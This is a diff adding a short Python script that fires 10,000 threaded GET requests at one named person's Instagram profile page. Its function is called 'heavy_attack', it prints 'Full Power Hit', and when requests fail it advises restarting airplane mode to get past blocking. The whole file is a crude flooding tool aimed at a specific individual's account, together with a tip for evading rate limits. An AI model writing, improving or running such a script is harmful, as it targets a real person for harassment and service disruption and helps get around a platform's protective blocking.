@@ -1,0 +1,15 @@
+import requests
+import concurrent.futures
+
+target = "ruhan_kazmi_1122"
+
+def heavy_attack(i):
+    try:
+        r = requests.get(f"https://www.instagram.com/{target}/", timeout=5)
+        print(f"⚡ Full Power Hit {i}...")
+    except:
+        print("❌ Blocked! Restart Airplane Mode.")
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    executor.map(heavy_attack, range(1, 10000))
+
